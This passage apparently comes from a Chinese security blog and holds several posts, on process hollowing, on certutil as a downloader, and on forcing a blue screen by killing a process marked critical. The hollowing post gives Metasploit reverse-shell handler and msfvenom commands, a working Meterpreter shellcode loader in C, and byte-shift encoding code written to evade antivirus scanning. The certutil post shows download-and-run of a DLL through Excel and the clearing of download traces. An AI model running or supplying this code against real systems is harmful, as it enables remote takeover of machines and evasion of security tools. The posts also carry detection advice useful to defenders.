<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-13/3-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>使用DynamicWrapperX 2.0需要提前卸载DynamicWrapperX 1.0</p>

<p>否则，使用2.0需要将object改为DynamicWrapperX.2，如：</p>

<p><code class="language-plaintext highlighter-rouge">new ActiveXObject("DynamicWrapperX")</code>改为<code class="language-plaintext highlighter-rouge">new ActiveXObject("DynamicWrapperX.2")</code></p>

<p>如图
<img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-13/3-4.png" alt="Alt text"></p>

<h2 id="0x06-防御">0x06 防御</h2>
<hr>
<p>该方法利用的前提是注册dynwrapx.dll，所以通过查看系统已注册的com组件就能够检测该方法</p>

<p><strong>推荐工具：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RegDllView
</code></pre></div></div>

<p><strong>下载地址：</strong></p>

<p>http://www.nirsoft.net/utils/registered_dll_view.html</p>

<p><strong>特点：</strong></p>

<ul>
  <li>显示所有注册DLL/OCX / exe文件列表</li>
  <li>查看注册的最近时间</li>
  <li>查看CLSID和ProgID</li>
  <li>可以手动卸载DLL/OCX文件</li>
  <li>可以手动注册DLL/OCX文件</li>
</ul>

<p>如图，通过查看已注册的COM控件，找到dynwrapx.dll</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-13/4-1.png" alt="Alt text"></p>

<p>手动卸载组件，即可限制该方法的运用。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 13, 2016
  </div>

  
</article><article class="post">
  <h1>傀儡进程的实现与检测</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近在安全动态推送中看到了一篇文章《RunPE: How to hide code behind a legit process》，介绍了将恶意代码注于已知进程的方法</p>

<p>文章发布于2015年6月，虽然作者未公布完整的实现代码，但介绍了实现思路</p>

<p>本文将结合自己的心得做进一步介绍，测试开源实现代码，介绍防御方法</p>

<p>文章地址：</p>

<p>https://www.adlice.com/runpe-hide-code-behind-legit-process/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>实现原理</li>
  <li>开源代码测试</li>
  <li>优化思路</li>
  <li>防御检测</li>
</ul>

<h2 id="0x02-实现原理">0x02 实现原理</h2>
<hr>

<p>这个利用方法至少在2005以前就存在，国内常常把该方法称为”傀儡进程的创建”</p>

<p><strong>实现思路：</strong></p>

<ol>
  <li>通过CreateProcess创建进程，传入参数CREATE_SUSPENDED使进程挂起</li>
  <li>通过NtUnmapViewOfSection清空新进程的内存数据</li>
  <li>通过VirtualAllocEx申请新的内存</li>
  <li>通过WriteProcessMemory向内存写入payload</li>
  <li>通过SetThreadContext设置入口点</li>
  <li>通过ResumeThread唤醒进程，执行payload</li>
</ol>

<p>在具体实现上，还需要考虑以下问题：</p>

<h3 id="1傀儡进程的选择">1、傀儡进程的选择</h3>

<p>如果傀儡进程已经运行，那么将无法实现替换(指针不可控、无法获得主线程句柄等)</p>

<p>所以这种利用方法只能通过创建新进程，传入参数<code class="language-plaintext highlighter-rouge">CREATE_SUSPENDED</code>使进程挂起，在进程执行前对其替换</p>

<h3 id="2清空新进程的内存数据">2、清空新进程的内存数据</h3>

<p>进程初始化后，内存会加载映像文件，为了清空新进程的内存数据，可以使用函数<code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code>卸载映像</p>

<p>函数<code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code>需要从ntdll.dll获得，调用代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
DWORD dwResult = NtUnmapViewOfSection(pProcessInfo-&gt;hProcess, pPEB-&gt;ImageBaseAddress);
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code>还能用来结束进程</p>

<h3 id="3申请新的内存">3、申请新的内存</h3>

<p>使用<code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>函数时，可以将傀儡进程的ImageBaseAddress作为申请空间的首地址，这样可以避免考虑“重定位”的问题</p>

<h3 id="4写入payload">4、写入payload</h3>

<p>写入时，需要先比较payload和傀儡进程的ImageBaseAddress之间的偏移，如果存在偏移，需要进行重定位(使用.reloc区段)</p>

<h3 id="5恢复环境">5、恢复环境</h3>

<p>替换前后需要保证寄存器正常，所以仅需要修改进程的入口点(即EAX寄存器)</p>

<p>通过<code class="language-plaintext highlighter-rouge">GetThreadContext</code>获得所有寄存器的信息(保存在结构体_CONTEXT中)</p>

<p>_CONTEXT的定义位于winnt.h，具体内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _CONTEXT {
//
// The flags values within this flag control the contents of
// a CONTEXT record.
//
// If the context record is used as an input parameter, then
// for each portion of the context record controlled by a flag
// whose value is set, it is assumed that that portion of the
// context record contains valid context. If the context record
// is being used to modify a threads context, then only that
// portion of the threads context will be modified.
//
// If the context record is used as an IN OUT parameter to capture
// the context of a thread, then only those portions of the thread's
// context corresponding to set flags will be returned.
//
// The context record is never used as an OUT only parameter.
//
DWORD ContextFlags;
//
// This section is specified/returned if CONTEXT_DEBUG_REGISTERS is
// set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT
// included in CONTEXT_FULL.
//
DWORD   Dr0;
DWORD   Dr1;
DWORD   Dr2;
DWORD   Dr3;
DWORD   Dr6;
DWORD   Dr7;
//
// This section is specified/returned if the
// ContextFlags word contians the flag CONTEXT_FLOATING_POINT.
//
FLOATING_SAVE_AREA FloatSave;
//
// This section is specified/returned if the
// ContextFlags word contians the flag CONTEXT_SEGMENTS.
//
DWORD   SegGs;
DWORD   SegFs;
DWORD   SegEs;
DWORD   SegDs;
//
// This section is specified/returned if the
// ContextFlags word contians the flag CONTEXT_INTEGER.
//
DWORD   Edi;
DWORD   Esi;
DWORD   Ebx;
DWORD   Edx;
DWORD   Ecx;
DWORD   Eax;
//
// This section is specified/returned if the
// ContextFlags word contians the flag CONTEXT_CONTROL.
//
DWORD   Ebp;
DWORD   Eip;
DWORD   SegCs;              // MUST BE SANITIZED
DWORD   EFlags;             // MUST BE SANITIZED
DWORD   Esp;
DWORD   SegSs;
//
// This section is specified/returned if the ContextFlags word
// contains the flag CONTEXT_EXTENDED_REGISTERS.
// The format and contexts are processor specific
//
BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
&gt; } CONTEXT;
</code></pre></div></div>

<p>将寄存器EAX的值设置为起始地址，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pContext-&gt;Eax = (DWORD)pPEB-&gt;ImageBaseAddress + pSourceHeaders-&gt;OptionalHeader.AddressOfEntryPoint;
</code></pre></div></div>

<p>接着利用<code class="language-plaintext highlighter-rouge">SetThreadContext</code>写入，修改入口点</p>

<p>通过<code class="language-plaintext highlighter-rouge">ResumeThread</code>唤醒进程，即可执行payload</p>

<h2 id="0x03-开源代码测试">0x03 开源代码测试</h2>
<hr>

<p>实现傀儡进程的公开代码有很多，这里给出一个参考地址:</p>

<p>http://code.google.com/p/process-hollowing/downloads/list</p>

<p>该工程的说明文档地址：</p>

<p>http://www.autosectools.com/process-hollowing.pdf</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/3-1.png" alt="Alt text"></p>

<p>如果需要查看内存数据，可以使用https://www.adlice.com/runpe-hide-code-behind-legit-process/中使用的工具：Process Hacker</p>

<p>参照上图的输出数据，image base为<code class="language-plaintext highlighter-rouge">0x00B90000</code></p>

<p>查看新进程<code class="language-plaintext highlighter-rouge">0x00B90000</code>的数据，已经被成功替换为payload</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/3-2.png" alt="Alt text"></p>

<p>继续下面的测试，参照源代码，修改payload为执行shellcode格式的Meterpreter</p>

<p>server：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.81.192
set LPORT 4444
exploit
</code></pre></div></div>

<p>Clinet：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.81.192 LPORT=4444 -f c
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use windows/shell/reverse_tcp
set LHOST 192.168.81.192
generate -t c
</code></pre></div></div>

<p>选择stage 1(281 bytes)即可</p>

<p>生成shellcode后，HelloWorld工程实现执行shellcode功能的源代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
    unsigned char shellcode1[] =  
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        "\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x51\xc0\x68\x02"
        "\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
        "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
        "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
        "\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
        "\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
        "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
        "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3";

    typedef void (__stdcall *CODE) ();    
    PVOID p = NULL;    
    if ((p = VirtualAlloc(NULL, sizeof(shellcode1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)   
        MessageBoxA(NULL, "error", "VirtualAlloc", MB_OK);    
    if (!(memcpy(p, shellcode1, sizeof(shellcode1))))    
        MessageBoxA(NULL, "error", "memcpy", MB_OK);    
    CODE code =(CODE)p;       
    code(); 

    return 0;
}
</code></pre></div></div>

<p>执行ProcessHollowing.exe，加载HelloWorld.exe，弹回shell，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/3-3.png" alt="Alt text"></p>

<p>由于使用了Meterpreter，HelloWorld.exe会被杀毒软件静态查杀，这里做一个简单的加解密即可绕过</p>

<p>对HelloWorld.exe逐字符作0x33加，源代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;

char *SoucePath = "c:\\1\\HelloWorld.exe";
char *DesPath = "c:\\1\\test\\HelloWorld.exe";

int _tmain(int argc, _TCHAR* argv[])
{
    HANDLE hFile = CreateFileA
    (
        SoucePath,
        GENERIC_READ, 
        0, 
        0, 
        OPEN_ALWAYS, 
        0, 
        0
    );
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Open file error\n");
        return 0;
    }
    DWORD dwSize = GetFileSize(hFile, 0);
    PBYTE pBuffer = new BYTE[dwSize];
    DWORD dwBytesRead = 0;
    ReadFile(hFile, pBuffer, dwSize, &amp;dwBytesRead, 0);
    PBYTE pBuffer2 = new BYTE[dwSize];
    PBYTE pBuffer3 = new BYTE[dwSize];
    for(DWORD i=0;i&lt;dwSize;i++)
    {
        pBuffer2[i]=pBuffer[i]+0x33;
    }
/*
    for(DWORD i=0;i&lt;dwSize;i++)
    {
        pBuffer3[i]=pBuffer2[i]-0x33;
    }       
*/  
    HANDLE hFile2 = CreateFileA
    (
        DesPath,
        GENERIC_WRITE, 
        0, 
        0, 
        CREATE_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, 
        0
    );
    if (hFile2 == INVALID_HANDLE_VALUE)
    {
        printf("Create file error\n");
        CloseHandle(hFile2);
        return 0;
    }
    WriteFile(hFile2,pBuffer2,dwSize,&amp;dwSize,NULL);
    CloseHandle(hFile2);
    return 0;
}
</code></pre></div></div>

<p>输出新的加密文件HelloWorld.exe，不会被静态查杀</p>

<p>ProcessHollowing工程添加一个解密操作，逐字符作0x33减，关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD dwSize = GetFileSize(hFile, 0);
PBYTE pBuffer = new BYTE[dwSize];
PBYTE pBuffer2 = new BYTE[dwSize];
DWORD dwBytesRead = 0;
ReadFile(hFile, pBuffer2, dwSize, &amp;dwBytesRead, 0);
for(DWORD i=0;i&lt;dwSize;i++)
{
    pBuffer[i]=pBuffer2[i]-0x33;
}
</code></pre></div></div>

<p>至此，完成静态查杀的绕过</p>

<p><strong>注：</strong></p>

<p>ProcessHollowing.exe行为拦截的绕过，本文暂不介绍</p>

<h2 id="0x04-防御检测">0x04 防御检测</h2>

<p>这种傀儡进程的利用，由于最开始创建了正常的进程，因此欺骗性很高</p>

<p>例如创建傀儡进程calc.exe,进程的图标和描述都是正常的calc.exe，数字签名也正常</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/4-1.png" alt="Alt text"></p>

<p><strong>防御方法：</strong></p>

<ol>
  <li>使用杀毒软件，拦截函数SetThreadContext</li>
  <li>参考原文给出的建议，使用RogueKiller，对比PE文件在本地和内存之间是否有区别</li>
</ol>

<p>RogueKiller下载地址：</p>

<p>https://www.adlice.com/download/roguekiller/</p>

<p>检测如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/4-2.png" alt="Alt text"></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文站在技术研究的角度，介绍了“傀儡进程”实现的原理，测试开源代码，给出防御检测的方法。虽然是很古老的技术，但其中的技术细节值得掌握。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 30, 2017
  </div>

  
</article><article class="post">
  <h1>渗透测试中的certutil</h1>

  <div class="entry">
    <hr>

<h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近在Casey Smith‏ @subTee的twitter上学到了关于certutil的一些利用技巧。本文将结合自己的一些经验，介绍certutil在渗透测试中的应用，对cmd下downloader的实现方法作补充，总结base64编码转换的常用方法。</p>

<p><strong>学习地址：</strong></p>

<p>https://twitter.com/subTee/status/888101536475344896</p>

<p>https://twitter.com/subTee/status/888071631528235010</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>certutil.exe在渗透测试中的应用</li>
  <li>downloader常用方法</li>
  <li>base64编码转换常用方法</li>
</ul>

<h2 id="0x02-certutil简介">0x02 certutil简介</h2>
<hr>

<p>用于证书管理</p>

<p>支持xp-win10</p>

<p>更多操作说明见https://technet.microsoft.com/zh-cn/library/cc755341(v=ws.10).aspx</p>

<p><strong>注：</strong></p>

<p>在之前的文章《域渗透——EFS文件解密》有用过certutil.exe导入证书</p>

<h2 id="0x03-渗透测试中的应用">0x03 渗透测试中的应用</h2>
<hr>

<h3 id="1downloader">1、downloader</h3>

<p>(1) 保存在当前路径，文件名称同URL</p>

<p>eg：</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt</code></p>

<p>(2) 保存在当前路径，指定保存文件名称</p>

<p>eg：</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt</code></p>

<p>(3) 保存在缓存目录，名称随机</p>

<p>缓存目录位置： <code class="language-plaintext highlighter-rouge">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>

<p>eg：</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt</code></p>

<p>(4) 支持保存二进制文件</p>

<p>eg：</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll</code></p>

<p><strong>注：</strong></p>

<p>使用downloader默认在缓存目录位置： <code class="language-plaintext highlighter-rouge">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code>保存下载的文件副本</p>

<p><strong>清除下载文件副本方法：</strong></p>

<p><strong>方法1：</strong> 直接删除缓存目录对应文件</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-26/2-1.png" alt="Alt text"></p>

<p><strong>方法2：</strong> 命令行:</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete</code></p>

<p><strong>补充：</strong></p>

<p>查看缓存项目：</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache *</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-26/2-2.png" alt="Alt text"></p>

<p><strong>实际测试：</strong></p>

<p>测试系统安装Office软件，下载执行dll对应的powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$path="c:\test\msg1.dll"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll $path
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL($path)
</code></pre></div></div>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-26/2-3.png" alt="Alt text"></p>

<h3 id="2计算文件hash">2、计算文件hash</h3>

<p>(1) SHA1</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -hashfile msg.dll</code></p>

<p>(2) SHA256：</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -hashfile msg.dll SHA256</code></p>

<p>(3) MD5：</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -hashfile msg.dll MD5</code></p>

<h3 id="3base64编码转换">3、base64编码转换</h3>

<p>(1) base64编码：</p>

<p><code class="language-plaintext highlighter-rouge">CertUtil -encode InFile OutFile</code></p>

<p>(2) base64解码</p>

<p><code class="language-plaintext highlighter-rouge">CertUtil -decode InFile OutFile</code></p>

<p><strong>注：</strong></p>

<p>编码后的文件会添加两处标识信息：</p>

<p>文件头：</p>

<p><code class="language-plaintext highlighter-rouge">-----BEGIN CERTIFICATE-----</code></p>

<p>文件尾：</p>

<p><code class="language-plaintext highlighter-rouge">-----END CERTIFICATE-----</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-26/2-4.png" alt="Alt text"></p>

<h2 id="0x04-downloader常用方法">0x04 downloader常用方法</h2>
<hr>

<p>在之前的文章《渗透技巧——通过cmd上传文件的N种方法》整理过常用的cmd下downloader方法，相比来说，利用certUtil简便快捷，但是使用后需要注意清除缓存，路径如下：</p>

<p><code class="language-plaintext highlighter-rouge">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>

<p>downloader常用方法如下：</p>

<ul>
  <li>certUtil</li>
  <li>powershell</li>
  <li>csc</li>
  <li>vbs</li>
  <li>JScript</li>
  <li>hta</li>
  <li>bitsadmin</li>
  <li>wget</li>
  <li>debug</li>
  <li>ftp</li>
  <li>ftfp</li>
</ul>

<h2 id="0x05-base64编码转换常用方法">0x05 base64编码转换常用方法</h2>
<hr>

<p>在编写脚本操作二进制文件时，常常会因为不可见字符报错，所以通常会选择先对二进制文件作base64编码再操作，最后通过解码还原出二进制文件。</p>

<p>所以在此整理一下常用不同开发工具对应的base64编码转换方式</p>

<h3 id="1powershell">1、powershell</h3>

<p>base64编码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$PEBytes = [System.IO.File]::ReadAllBytes("C:\windows\system32\calc.exe")
$Base64Payload = [System.Convert]::ToBase64String($PEBytes)
Set-Content base64.txt -Value $Base64Payload
</code></pre></div></div>

<p>base64解码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$Base64Bytes = Get-Content ("base64.txt")
$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)
[System.IO.File]::WriteAllBytes("calc.exe",$PEBytes)
</code></pre></div></div>

<h3 id="2c-sharpc">2、C SHARP（c#）</h3>

<p>base64编码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.IO;

byte[] AsBytes = File.ReadAllBytes(@"C:\windows\system32\calc.exe");
String AsBase64String = Convert.ToBase64String(AsBytes);
StreamWriter sw = new StreamWriter(@"C:\test\base64.txt");
sw.Write(AsBase64String);
sw.Close();
</code></pre></div></div>

<p>base64解码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.IO;

String AsString = File.ReadAllText(@"C:\test\base64.txt");
byte[] bytes = Convert.FromBase64String(AsString);          
FileStream fs = new FileStream(@"C:\test\calc.exe", FileMode.Create);
fs.Write(bytes, 0, bytes.Length);
fs.Flush();
fs.Close();
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>在之前的文章《渗透技巧——通过cmd上传文件的N种方法》存在两处bug</p>

<blockquote>
  <p>“ 解密base64文件并生成exe的方法： ”</p>
</blockquote>

<p>其中的powershell代码和c#代码存在bug，修正的代码以本文为准</p>

<h3 id="3js">3、js</h3>

<p>base64解码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fso1=new ActiveXObject("Scripting.FileSystemObject");
f=fso1.OpenTextFile("C:\\test\\base64.txt",1);
base64string=f.ReadAll();
f.Close();
enc = new ActiveXObject("System.Text.ASCIIEncoding");
length = enc.GetByteCount_2(base64string);
ba = enc.GetBytes_4(base64string);
transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
ba = transform.TransformFinalBlock(ba, 0, length);
s=new ActiveXObject("ADODB.Stream");
s.Type=1;
s.Open();
s.Write(ba);	
s.SaveToFile("C:\\test\\calc.exe",2);
</code></pre></div></div>

<h3 id="4certutil">4、certutil</h3>

<p>base64编码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CertUtil -encode InFile OutFile
</code></pre></div></div>

<p>base64解码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CertUtil -decode InFile OutFile
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>编码后的文件会添加两处标识信息：</p>

<p>文件头：</p>

<p>—–BEGIN CERTIFICATE—–</p>

<p>文件尾：</p>

<p>—–END CERTIFICATE—–</p>

<h2 id="0x06-检测downloader">0x06 检测downloader</h2>
<hr>

<p>查看利用certUtil下载文件的缓存记录：</p>

<p><code class="language-plaintext highlighter-rouge">certutil.exe -urlcache *</code></p>

<p>缓存文件位置：</p>

<p><code class="language-plaintext highlighter-rouge">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了certutil在渗透测试中的应用，详细介绍利用certutil作downloader的实现方法和检测方法，最后总结了base64编码转换的常用方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 26, 2017
  </div>

  
</article><article class="post">
  <h1>结束进程导致BSOD的利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>BSOD，全称Blue Screen of Death，即蓝屏死机。
通常是Ring0级的内核程序出错导致，在提权漏洞中经常遇到。
而在渗透测试中，某些情况下需要重启系统，例如配置Password Filter DLL，启用Wdigest Auth，重启域控服务器等。</p>

<p>某些条件下，可以选择触发BSOD导致系统重新启动。</p>

<p>那么，是否存在一个稳定的方法触发BSOD呢？更进一步的利用思路呢？如何防御？</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>测试几种结束当前进程导致BSOD的方法</li>
  <li>修改指定进程，当进程退出后，导致BSOD</li>
  <li>如何防御</li>
</ul>

<h2 id="0x02-结束当前进程导致bsod的方法">0x02 结束当前进程导致BSOD的方法</h2>
<hr>

<p>找到如下参考资料：</p>

<p>https://blog.csdn.net/qq125096885/article/details/52911870</p>

<p>提供多种结束当前进程导致BSOD的方法</p>

<p>经测试，适用Win7系统的方法有以下三种：</p>

<ul>
  <li>CallRtlSetProcessIsCritical</li>
  <li>CallNtSetInformationThread</li>
  <li>CallNtRaiseHardError</li>
</ul>

<h3 id="1callrtlsetprocessiscritical">1、CallRtlSetProcessIsCritical</h3>

<p>关键代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RtlSetProcessIsCritical(TRUE, NULL, FALSE);
</code></pre></div></div>

<p>参考资料：</p>

<p>https://www.codeproject.com/Articles/43405/Protecting-Your-Process-with-RtlSetProcessIsCriti</p>

<p>函数原型：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NTSTATUS 
RtlSetProcessIsCritical (
    BOOLEAN bNew,    	// new setting for process
    BOOLEAN *pbOld,    	// pointer which receives old setting (can be null)
    BOOLEAN bNeedScb);    	// need system critical breaks
</code></pre></div></div>

<p>第一个参数，设置为TRUE时，表示将当前进程标记为critical process；设置为FALSE时，当前进程不是critical process</p>

<h4 id="critical-process">critical process:</h4>

<p>系统进程特有，已知以下系统进程为critical process：</p>

<ul>
  <li>csrss.exe</li>
  <li>lsass.exe</li>
  <li>services.exe</li>
  <li>smss.exe</li>
  <li>svchost.exe</li>
  <li>wininit.exe</li>
</ul>

<p>当critical process退出时，会导致系统BSOD，所以如果我们将当前进程也设置为critical process，那么在进程退出时同样会导致BSOD</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-2/2-1.png" alt="Alt text"></p>

<h3 id="2ntsetinformationprocess">2、NtSetInformationProcess</h3>

<p>关键代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ULONG A = 1;
NtSetInformationProcess(GetCurrentProcess(), ProcessBreakOnTermination, &amp;A, sizeof(ULONG));
</code></pre></div></div>

<p>参考资料：</p>

<p>http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FNtSetInformationProcess.html</p>

<p>函数原型：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NtSetInformationProcess(

  IN HANDLE               ProcessHandle,
  IN PROCESS_INFORMATION_CLASS ProcessInformationClass,
  IN PVOID                ProcessInformation,
  IN ULONG                ProcessInformationLength );
</code></pre></div></div>

<p>第一个参数表示进程句柄</p>

<p>第二个参数ProcessInformationClass，我在NtQueryInformationProcess的说明中找到了参考，地址如下：</p>

<p>https://docs.microsoft.com/en-us/windows/desktop/api/winternl/nf-winternl-ntqueryinformationprocess</p>

<blockquote>
  <p>ProcessBreakOnTermination：29，Retrieves a ULONG value indicating whether the process is considered critical.</p>
</blockquote>

<p>所以ProcessInformationClass设置为29</p>

<p>第三个参数ProcessInformation，设置为TRUE时，表示将当前进程标记为critical process；设置为FALSE时，当前进程不是critical process</p>

<p>第四个参数为长度，即sizeof(ULONG）</p>

<h3 id="3callntraiseharderror">3、CallNtRaiseHardError</h3>

<p>关键代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef enum _HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, *PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {
	ResponseReturnToCaller,
	ResponseNotHandled,
	ResponseAbort,
